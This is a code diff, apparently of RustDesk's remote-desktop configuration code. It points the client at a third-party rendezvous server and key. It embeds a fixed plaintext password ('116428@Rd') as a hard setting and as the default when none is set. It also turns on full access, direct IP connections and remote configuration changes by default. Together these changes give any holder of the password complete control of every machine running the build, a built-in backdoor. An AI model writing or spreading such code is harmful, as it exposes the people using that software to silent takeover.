@@ -79,7 +79,12 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    // 修改为
+pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+    let mut map = HashMap::new();
+    map.insert("password".to_string(), "116428@Rd".to_string());
+    RwLock::new(map)
+};
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -114,8 +119,9 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+// 修改为
+pub const RENDEZVOUS_SERVERS: &[&str] = &["rustdesk.qq.iw2u.cn"];
+pub const RS_PUB_KEY: &str = "vLS6F7hufPabK4mbDPyGMBbn+Y3vexV66BEO+0kuRYU=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -490,6 +496,23 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        // 默认完全访问
+        if !config.options.contains_key("access-mode") {
+            config.options.insert("access-mode".to_string(), "full".to_string());
+            store = true;
+        }
+        
+        // 默认启用允许IP直连
+        if !config.options.contains_key("direct-server") {
+            config.options.insert("direct-server".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // 默认启用允许远程修改配置
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -609,6 +632,13 @@ impl Config {
     fn load() -> Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
+    
+    // 添加：内置固定密码
+    if config.password.is_empty() {
+        config.password = "116428@Rd".to_string();
+        store = true;
+    }
+    
         if let Err(err) = Self::validate_or_decrypt_permanent_password_storage(&mut config) {
             log::error!("Failed to validate or decrypt permanent password storage: {err}");
         }
@@ -2140,7 +2170,18 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+        
+        if !config.options.contains_key("enable-ipv6-punch") {
+            config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        if store {
+            config.store();
+        }
+        config
     }
 
     fn store(&self) {
@@ -2359,6 +2400,16 @@ impl UserDefaultConfig {
 
     pub fn get(&self, key: &str) -> String {
         match key {
+
+  // 添加：
+        keys::OPTION_I444 => {
+            let v = self.get_after(key).map(|v| v.to_string()).unwrap_or_default();
+            if v.is_empty() {
+                return "Y".to_string();
+            }
+            return v;
+        }
+
             #[cfg(any(target_os = "android", target_os = "ios"))]
             keys::OPTION_VIEW_STYLE => self.get_string(key, "adaptive", vec!["original"]),
             #[cfg(not(any(target_os = "android", target_os = "ios")))]
